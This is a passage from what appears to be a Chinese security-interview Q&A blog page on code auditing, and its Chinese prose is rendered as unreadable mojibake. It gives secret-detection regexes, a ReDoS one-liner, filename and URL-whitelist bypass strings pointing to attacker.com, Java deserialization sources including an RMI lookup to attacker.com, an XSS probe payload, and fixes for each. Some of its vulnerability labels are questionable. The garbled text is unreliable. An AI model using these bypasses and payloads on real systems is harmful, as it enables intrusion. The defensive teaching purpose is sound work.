æ¼æ´åˆ†ç±»ï¼Œåˆ¶å®šæ ‡å‡†åŒ–ä¿®å¤æµç¨‹ã€‚- è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œå‡å°‘å›å½’æµ‹è¯•æˆæœ¬ã€‚- å¼€å‘å®‰å…¨åŸ¹è®­ï¼Œæé«˜ä¿®å¤èƒ½åŠ›ã€‚"></a><strong>ä¼˜åŒ–æ–¹æ³•</strong>ï¼š<br>- <strong>æ¼æ´åˆ†ç±»</strong>ï¼Œåˆ¶å®šæ ‡å‡†åŒ–ä¿®å¤æµç¨‹ã€‚<br>- <strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>ï¼Œå‡å°‘å›å½’æµ‹è¯•æˆæœ¬ã€‚<br>- <strong>å¼€å‘å®‰å…¨åŸ¹è®­</strong>ï¼Œæé«˜ä¿®å¤èƒ½åŠ›ã€‚</h2><h3 id="ä»€ä¹ˆç±»å‹æ¼æ´æ˜¯ä»£ç å®¡è®¡æ— æ³•å‡†ç¡®åˆ¤æ–­å­˜åœ¨ä¸å¦çš„ï¼Ÿ"><a href="#ä»€ä¹ˆç±»å‹æ¼æ´æ˜¯ä»£ç å®¡è®¡æ— æ³•å‡†ç¡®åˆ¤æ–­å­˜åœ¨ä¸å¦çš„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆç±»å‹æ¼æ´æ˜¯ä»£ç å®¡è®¡æ— æ³•å‡†ç¡®åˆ¤æ–­å­˜åœ¨ä¸å¦çš„ï¼Ÿ"></a><strong>ä»€ä¹ˆç±»å‹æ¼æ´æ˜¯ä»£ç å®¡è®¡æ— æ³•å‡†ç¡®åˆ¤æ–­å­˜åœ¨ä¸å¦çš„ï¼Ÿ</strong></h3><p><strong>å¸¸è§éš¾ä»¥åˆ¤æ–­çš„æ¼æ´</strong>ï¼š</p><ul><li><strong>ä¸šåŠ¡é€»è¾‘æ¼æ´</strong>ï¼šå¦‚æ”¯ä»˜æ¥å£ç»•è¿‡ã€ç§¯åˆ†æ¼æ´ï¼Œä¾èµ–å…·ä½“ä¸šåŠ¡é€»è¾‘ã€‚</li><li><strong>æƒé™æ§åˆ¶é—®é¢˜</strong>ï¼šä»…çœ‹ä»£ç éš¾ä»¥åˆ¤æ–­ API æ˜¯å¦å¯è¢«æœªæˆæƒç”¨æˆ·è®¿é—®ã€‚</li><li><strong>æ—¶é—´ç›¸å…³æ¼æ´</strong>ï¼šå¦‚ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰ï¼Œä»£ç é™æ€åˆ†æéš¾ä»¥æ£€æµ‹ã€‚</li><li><strong>åŠ å¯†å®‰å…¨æ€§</strong>ï¼šä»…ä»ä»£ç æ— æ³•åˆ¤æ–­åŠ å¯†ç®—æ³•çš„å¼ºåº¦ï¼Œéœ€ç»“åˆå®é™…ä½¿ç”¨ç¯å¢ƒåˆ†æã€‚</li></ul><h2 id="è§£å†³æ–¹æ¡ˆï¼š-ç»“åˆåŠ¨æ€åˆ†æï¼ˆDASTï¼‰-äººå·¥æµ‹è¯•ï¼ŒéªŒè¯æ¼æ´æ˜¯å¦å¯è¢«åˆ©ç”¨ã€‚"><a href="#è§£å†³æ–¹æ¡ˆï¼š-ç»“åˆåŠ¨æ€åˆ†æï¼ˆDASTï¼‰-äººå·¥æµ‹è¯•ï¼ŒéªŒè¯æ¼æ´æ˜¯å¦å¯è¢«åˆ©ç”¨ã€‚" class="headerlink" title="è§£å†³æ–¹æ¡ˆï¼š- ç»“åˆåŠ¨æ€åˆ†æï¼ˆDASTï¼‰+äººå·¥æµ‹è¯•ï¼ŒéªŒè¯æ¼æ´æ˜¯å¦å¯è¢«åˆ©ç”¨ã€‚"></a><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<br>- ç»“åˆåŠ¨æ€åˆ†æï¼ˆDASTï¼‰+äººå·¥æµ‹è¯•ï¼ŒéªŒè¯æ¼æ´æ˜¯å¦å¯è¢«åˆ©ç”¨ã€‚</h2><h3 id="å¯†é’¥çš„è¯†åˆ«çš„æ­£åˆ™å¦‚ä½•å†™ï¼Ÿ"><a href="#å¯†é’¥çš„è¯†åˆ«çš„æ­£åˆ™å¦‚ä½•å†™ï¼Ÿ" class="headerlink" title="å¯†é’¥çš„è¯†åˆ«çš„æ­£åˆ™å¦‚ä½•å†™ï¼Ÿ"></a><strong>å¯†é’¥çš„è¯†åˆ«çš„æ­£åˆ™å¦‚ä½•å†™ï¼Ÿ</strong></h3><h2 id="åŒ¹é…-API-Keyã€JWTã€OAuth-Tokenï¼š-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-åŒ¹é…-AWS-è®¿é—®å¯†é’¥ï¼šAKIA-0-9A-Z-16-åŒ¹é…ç§é’¥ï¼š-BEGIN-RSA-DSA-EC-PRIVATE-KEY-ä¿®å¤æ–¹æ¡ˆï¼š-ç¦æ­¢å¯†é’¥ç¡¬ç¼–ç ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡æˆ–é…ç½®ç®¡ç†å·¥å…·å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚"><a href="#åŒ¹é…-API-Keyã€JWTã€OAuth-Tokenï¼š-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-åŒ¹é…-AWS-è®¿é—®å¯†é’¥ï¼šAKIA-0-9A-Z-16-åŒ¹é…ç§é’¥ï¼š-BEGIN-RSA-DSA-EC-PRIVATE-KEY-ä¿®å¤æ–¹æ¡ˆï¼š-ç¦æ­¢å¯†é’¥ç¡¬ç¼–ç ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡æˆ–é…ç½®ç®¡ç†å·¥å…·å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚" class="headerlink" title="åŒ¹é… API Keyã€JWTã€OAuth Tokenï¼š(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]{20,60})[&quot;&#39;]?åŒ¹é… AWS è®¿é—®å¯†é’¥ï¼šAKIA[0-9A-Z]{16}åŒ¹é…ç§é’¥ï¼š-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----ä¿®å¤æ–¹æ¡ˆï¼š- ç¦æ­¢å¯†é’¥ç¡¬ç¼–ç ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡æˆ–é…ç½®ç®¡ç†å·¥å…·å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚"></a><strong>åŒ¹é… API Keyã€JWTã€OAuth Token</strong>ï¼š<br><code>(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]&#123;20,60&#125;)[&quot;&#39;]?</code><br><strong>åŒ¹é… AWS è®¿é—®å¯†é’¥</strong>ï¼š<br><code>AKIA[0-9A-Z]&#123;16&#125;</code><br><strong>åŒ¹é…ç§é’¥</strong>ï¼š<br><code>-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----</code><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ç¦æ­¢å¯†é’¥ç¡¬ç¼–ç ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡æˆ–é…ç½®ç®¡ç†å·¥å…·å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚</h2><h3 id="æ­£åˆ™-a-ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"><a href="#æ­£åˆ™-a-ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ" class="headerlink" title="æ­£åˆ™ (a+)+ ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"></a><strong>æ­£åˆ™ <code>(a+)+</code> ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ</strong></h3><p><strong>é£é™©ç‚¹</strong>ï¼š</p><ul><li><strong>æ­£åˆ™å›æº¯çˆ†ç‚¸ï¼ˆReDoSï¼‰</strong>ï¼šå½“è¾“å…¥è¾ƒé•¿çš„ <code>a</code> æ—¶ï¼Œæ­£åˆ™å¼•æ“å¯èƒ½ä¼šäº§ç”ŸæŒ‡æ•°çº§å›æº¯ï¼Œå¯¼è‡´ CPU è®¡ç®—é‡æ¿€å¢ï¼Œå¯èƒ½è¢« DoS æ”»å‡»åˆ©ç”¨ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import re; re.match(&quot;(a+)+&quot;, &quot;a&quot; * 100000)&#x27;</span></span><br></pre></td></tr></table></figure>å¯èƒ½å¯¼è‡´ CPU æŒ‚æ­»ã€‚</li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-é¿å…ä½¿ç”¨åµŒå¥—é‡å¤åŒ¹é…-a-ï¼Œæ”¹ç”¨-a-é™åˆ¶åŒ¹é…èŒƒå›´ã€‚-ä½¿ç”¨éå›æº¯æ­£åˆ™ï¼ˆå¦‚-RE2-å¼•æ“ï¼‰ã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-é¿å…ä½¿ç”¨åµŒå¥—é‡å¤åŒ¹é…-a-ï¼Œæ”¹ç”¨-a-é™åˆ¶åŒ¹é…èŒƒå›´ã€‚-ä½¿ç”¨éå›æº¯æ­£åˆ™ï¼ˆå¦‚-RE2-å¼•æ“ï¼‰ã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- é¿å…ä½¿ç”¨åµŒå¥—é‡å¤åŒ¹é… (a+)+ï¼Œæ”¹ç”¨ ^a+$ é™åˆ¶åŒ¹é…èŒƒå›´ã€‚- ä½¿ç”¨éå›æº¯æ­£åˆ™ï¼ˆå¦‚ RE2 å¼•æ“ï¼‰ã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- é¿å…ä½¿ç”¨åµŒå¥—é‡å¤åŒ¹é… <code>(a+)+</code>ï¼Œæ”¹ç”¨ <code>^a+$</code> é™åˆ¶åŒ¹é…èŒƒå›´ã€‚<br>- ä½¿ç”¨<strong>éå›æº¯æ­£åˆ™</strong>ï¼ˆå¦‚ RE2 å¼•æ“ï¼‰ã€‚</h2><h3 id="ç¨‹åºå¯¹è¯»å–çš„æ–‡ä»¶åçš„æ­£åˆ™ä¸º-markdown-ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#ç¨‹åºå¯¹è¯»å–çš„æ–‡ä»¶åçš„æ­£åˆ™ä¸º-markdown-ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="ç¨‹åºå¯¹è¯»å–çš„æ–‡ä»¶åçš„æ­£åˆ™ä¸º /\.markdown/ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"></a><strong>ç¨‹åºå¯¹è¯»å–çš„æ–‡ä»¶åçš„æ­£åˆ™ä¸º <code>/\.markdown/</code>ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼š</p><ul><li><strong>å¤§å°å†™ç»•è¿‡</strong>ï¼š<code>readme.Markdown</code></li><li><strong>ç¼–ç ç»•è¿‡</strong>ï¼š<code>readme.%6Darkdown</code></li><li><strong>ç›®å½•ç©¿è¶Š</strong>ï¼š<code>./readme.markdown./</code></li><li><strong>Unicode ç»•è¿‡</strong>ï¼š<code>readme.marğ—¸down</code>ï¼ˆåˆ©ç”¨ Unicode å˜ä½“ï¼‰</li><li><strong>åŒå†™ç»•è¿‡</strong>ï¼š<code>readme..markdown</code></li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼ä½¿ç”¨-basename-è§£æè·¯å¾„ï¼š"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼ä½¿ç”¨-basename-è§£æè·¯å¾„ï¼š" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ä¸¥æ ¼ä½¿ç”¨ basename è§£æè·¯å¾„ï¼š  "></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ä¸¥æ ¼ä½¿ç”¨ <code>basename</code> è§£æè·¯å¾„</strong>ï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">filename = os.path.basename(user_input)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&quot;.markdown&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid file type&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="ç¨‹åºå¯¹è¯·æ±‚çš„-URL-çš„æ­£åˆ™ä¸º-http-feei-cn-ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#ç¨‹åºå¯¹è¯·æ±‚çš„-URL-çš„æ­£åˆ™ä¸º-http-feei-cn-ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="ç¨‹åºå¯¹è¯·æ±‚çš„ URL çš„æ­£åˆ™ä¸º /^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"></a><strong>ç¨‹åºå¯¹è¯·æ±‚çš„ URL çš„æ­£åˆ™ä¸º <code>/^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/</code>ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼š</p><ul><li><strong>ç¼–ç ç»•è¿‡</strong>ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.fe%65i.cn</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>@</code> ç¬¦å·</strong>ï¼ˆURL è§£æå·®å¼‚ï¼‰ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.com@feei.cn</span><br></pre></td></tr></table></figure></li><li><strong>åŒå†™ <code>//</code> è§„é¿è§£æ</strong>ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://feei.cn//@attacker.com</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼è§£æåŸŸåï¼Œä¸ä¾èµ–æ­£åˆ™ï¼š"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼è§£æåŸŸåï¼Œä¸ä¾èµ–æ­£åˆ™ï¼š" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ä¸¥æ ¼è§£æåŸŸåï¼Œä¸ä¾èµ–æ­£åˆ™ï¼š  "></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ä¸¥æ ¼è§£æåŸŸå</strong>ï¼Œä¸ä¾èµ–æ­£åˆ™ï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_url</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parsed.netloc.endswith(<span class="string">&quot;.feei.cn&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid domain&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="è§£é‡Šå‹è¯­è¨€å’Œç¼–è¯‘å‹è¯­è¨€åœ¨è¯­æ³•æ ‘åˆ†æä¸Šæœ‰ä»€ä¹ˆå·®å¼‚ï¼Ÿ"><a href="#è§£é‡Šå‹è¯­è¨€å’Œç¼–è¯‘å‹è¯­è¨€åœ¨è¯­æ³•æ ‘åˆ†æä¸Šæœ‰ä»€ä¹ˆå·®å¼‚ï¼Ÿ" class="headerlink" title="è§£é‡Šå‹è¯­è¨€å’Œç¼–è¯‘å‹è¯­è¨€åœ¨è¯­æ³•æ ‘åˆ†æä¸Šæœ‰ä»€ä¹ˆå·®å¼‚ï¼Ÿ"></a><strong>è§£é‡Šå‹è¯­è¨€å’Œç¼–è¯‘å‹è¯­è¨€åœ¨è¯­æ³•æ ‘åˆ†æä¸Šæœ‰ä»€ä¹ˆå·®å¼‚ï¼Ÿ</strong></h3><p><strong>è§£é‡Šå‹è¯­è¨€ï¼ˆå¦‚ Pythonã€JavaScriptï¼‰</strong>ï¼š</p><ul><li><strong>åŠ¨æ€ç±»å‹</strong>ï¼šå˜é‡ç±»å‹å¯å˜ï¼Œå¢åŠ äº†é™æ€åˆ†æçš„éš¾åº¦ã€‚</li><li><strong>è¿è¡Œæ—¶ç‰¹æ€§</strong>ï¼šå¦‚ <code>eval()</code>ã€<code>exec()</code> ä½¿å¾—ä»£ç è¡Œä¸ºæ— æ³•å®Œå…¨é™æ€åˆ†æã€‚</li><li><strong>AST è§£æä¾èµ–ä¸Šä¸‹æ–‡</strong>ï¼šå¦‚ <code>import</code> è¯­å¥çš„åŠ¨æ€å¯¼å…¥ã€‚</li></ul><h2 id="ç¼–è¯‘å‹è¯­è¨€ï¼ˆå¦‚-Cã€Javaï¼‰ï¼š-ç±»å‹ç¡®å®šï¼šå˜é‡ç±»å‹åœ¨ç¼–è¯‘æœŸå·²ç¡®å®šï¼Œé™æ€åˆ†ææ›´ç¨³å®šã€‚-ä¼˜åŒ–å¯èƒ½å½±å“æ¼æ´åˆ†æï¼šç¼–è¯‘å™¨ä¼˜åŒ–å¯èƒ½å¯¼è‡´æŸäº›æ¼æ´éš¾ä»¥è¢«é™æ€åˆ†æå‘ç°ã€‚"><a href="#ç¼–è¯‘å‹è¯­è¨€ï¼ˆå¦‚-Cã€Javaï¼‰ï¼š-ç±»å‹ç¡®å®šï¼šå˜é‡ç±»å‹åœ¨ç¼–è¯‘æœŸå·²ç¡®å®šï¼Œé™æ€åˆ†ææ›´ç¨³å®šã€‚-ä¼˜åŒ–å¯èƒ½å½±å“æ¼æ´åˆ†æï¼šç¼–è¯‘å™¨ä¼˜åŒ–å¯èƒ½å¯¼è‡´æŸäº›æ¼æ´éš¾ä»¥è¢«é™æ€åˆ†æå‘ç°ã€‚" class="headerlink" title="ç¼–è¯‘å‹è¯­è¨€ï¼ˆå¦‚ Cã€Javaï¼‰ï¼š- ç±»å‹ç¡®å®šï¼šå˜é‡ç±»å‹åœ¨ç¼–è¯‘æœŸå·²ç¡®å®šï¼Œé™æ€åˆ†ææ›´ç¨³å®šã€‚- ä¼˜åŒ–å¯èƒ½å½±å“æ¼æ´åˆ†æï¼šç¼–è¯‘å™¨ä¼˜åŒ–å¯èƒ½å¯¼è‡´æŸäº›æ¼æ´éš¾ä»¥è¢«é™æ€åˆ†æå‘ç°ã€‚"></a><strong>ç¼–è¯‘å‹è¯­è¨€ï¼ˆå¦‚ Cã€Javaï¼‰</strong>ï¼š<br>- <strong>ç±»å‹ç¡®å®š</strong>ï¼šå˜é‡ç±»å‹åœ¨ç¼–è¯‘æœŸå·²ç¡®å®šï¼Œé™æ€åˆ†ææ›´ç¨³å®šã€‚<br>- <strong>ä¼˜åŒ–å¯èƒ½å½±å“æ¼æ´åˆ†æ</strong>ï¼šç¼–è¯‘å™¨ä¼˜åŒ–å¯èƒ½å¯¼è‡´æŸäº›æ¼æ´éš¾ä»¥è¢«é™æ€åˆ†æå‘ç°ã€‚</h2><h3 id="Java-Web-åº”ç”¨ä¸­çš„ååºåˆ—åŒ–æ¼æ´çš„-Source-å’Œ-Sink-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Java-Web-åº”ç”¨ä¸­çš„ååºåˆ—åŒ–æ¼æ´çš„-Source-å’Œ-Sink-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Java Web åº”ç”¨ä¸­çš„ååºåˆ—åŒ–æ¼æ´çš„ Source å’Œ Sink æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>Java Web åº”ç”¨ä¸­çš„ååºåˆ—åŒ–æ¼æ´çš„ Source å’Œ Sink æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>Sourceï¼ˆæ•°æ®å…¥å£ï¼‰</strong>ï¼š</p><ul><li><strong>ç”¨æˆ·å¯æ§è¾“å…¥</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br></pre></td></tr></table></figure></li><li><strong>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;attacker.com&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure></li><li><strong>æ–‡ä»¶è¯»å–</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(userInput);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br></pre></td></tr></table></figure></li></ul><p><strong>Sinkï¼ˆå±é™©æ‰§è¡Œç‚¹ï¼‰</strong>ï¼š</p><ul><li><strong><code>readObject()</code> è§¦å‘ååºåˆ—åŒ–</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li><li><strong>EL è§£æ</strong>ï¼ˆStruts2ï¼‰ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();</span><br></pre></td></tr></table></figure></li><li><strong>XStream ååºåˆ—åŒ–</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> xstream.fromXML(xml);</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨ä¸å®‰å…¨çš„-readObject-ï¼š-ä»…å…è®¸ååºåˆ—åŒ–å¯ä¿¡ç±»å‹ï¼š"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨ä¸å®‰å…¨çš„-readObject-ï¼š-ä»…å…è®¸ååºåˆ—åŒ–å¯ä¿¡ç±»å‹ï¼š" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ç¦ç”¨ä¸å®‰å…¨çš„ readObject()ï¼š  - ä»…å…è®¸ååºåˆ—åŒ–å¯ä¿¡ç±»å‹ï¼š  "></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ç¦ç”¨ä¸å®‰å…¨çš„ <code>readObject()</code>ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Deserialization not allowed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>- ä»…å…è®¸ååºåˆ—åŒ–å¯ä¿¡ç±»å‹ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> info -&gt; </span><br><span class="line">    info.serialClass() != <span class="literal">null</span> &amp;&amp; allowedClasses.contains(info.serialClass());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br></pre></td></tr></table></figure></h2><h3 id="é»‘ç›’å¦‚ä½•æ£€æµ‹-XSS-æ¼æ´ï¼Ÿ"><a href="#é»‘ç›’å¦‚ä½•æ£€æµ‹-XSS-æ¼æ´ï¼Ÿ" class="headerlink" title="é»‘ç›’å¦‚ä½•æ£€æµ‹ XSS æ¼æ´ï¼Ÿ"></a><strong>é»‘ç›’å¦‚ä½•æ£€æµ‹ XSS æ¼æ´ï¼Ÿ</strong></h3><p><strong>æ£€æµ‹æ–¹å¼</strong>ï¼š</p><ol><li><strong>è¾“å…¥ç‚¹æ¢æµ‹</strong>ï¼šä½¿ç”¨ <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ç­‰ XSS è½½è·æµ‹è¯•è¾“å…¥ç‚¹ã€‚</li><li><strong>DOM åˆ†æ</strong>ï¼šæ£€æµ‹æ˜¯å¦å­˜åœ¨ <code>innerHTML</code>ã€<code>eval()</code> ç­‰æ‰§è¡Œç‚¹ã€‚</li><li><strong>åå°„æµ‹è¯•</strong>ï¼šæäº¤ç‰¹å®šå­—ç¬¦ï¼Œå¦‚ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œè§‚å¯Ÿé¡µé¢å“åº”ã€‚</li><li><strong>CSP ç»•è¿‡</strong>ï¼šå¦‚æœç›®æ ‡å¯ç”¨äº† CSPï¼Œæµ‹è¯• JSONPã€æ•°æ® URLã€WebSocket ç­‰ç»•è¿‡æ–¹å¼ã€‚</li></ol><p><strong>è‡ªåŠ¨åŒ–å·¥å…·</strong>ï¼š</p><ul><li><strong>Burp Suite</strong>ï¼šä½¿ç”¨ XSS æ‰©å±•ï¼ˆå¦‚ XSS Validatorï¼‰è‡ªåŠ¨æ£€æµ‹ã€‚</li><li><strong>OWASP ZAP</strong>ï¼šå¯ç”¨ XSS æ‰«æè§„åˆ™ï¼Œæ£€æµ‹åå°„å‹ XSSã€‚</li></ul><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ä½¿ç”¨-Content-Security-Policy-é™åˆ¶-JavaScript-æ‰§è¡Œæ¥æºã€‚-é‡‡ç”¨-encodeURIComponent-å¯¹è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ä½¿ç”¨-Content-Security-Policy-é™åˆ¶-JavaScript-æ‰§è¡Œæ¥æºã€‚-é‡‡ç”¨-encodeURIComponent-å¯¹è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ä½¿ç”¨ Content-Security-Policy é™åˆ¶ JavaScript æ‰§è¡Œæ¥æºã€‚- é‡‡ç”¨ encodeURIComponent() å¯¹è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ä½¿ç”¨ <code>Content-Security-Policy</code> é™åˆ¶ JavaScript æ‰§è¡Œæ¥æºã€‚<br>- é‡‡ç”¨ <code>encodeURIComponent()</code> å¯¹è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚</h2><h4 id="ç”²æ–¹é»‘ç›’æ˜¯å¦åº”å…·å¤‡çˆ¬å–æµé‡åŠŸèƒ½ï¼Ÿ"><a href="#ç”²æ–¹é»‘ç›’æ˜¯å¦åº”å…·å¤‡çˆ¬å–æµé‡åŠŸèƒ½ï¼Ÿ" class="headerlink" title="ç”²æ–¹é»‘ç›’æ˜¯å¦åº”å…·å¤‡çˆ¬å–æµé‡åŠŸèƒ½ï¼Ÿ"></a><strong>ç”²æ–¹é»‘ç›’æ˜¯å¦åº”å…·å¤‡çˆ¬å–æµé‡åŠŸèƒ½ï¼Ÿ</strong></h4><p><strong>å¿…è¦æ€§</strong>ï¼š</p><ul><li><strong>éœ€è¦</strong>ï¼š<ul><li>ç”²æ–¹å®‰å…¨å›¢é˜Ÿé€šå¸¸ç”¨äºæ¸—é€æµ‹è¯•ï¼Œçˆ¬å–æµé‡æœ‰åŠ©äºå‘ç°éšè—æ¥å£ã€‚</li><li>é€‚ç”¨äº API 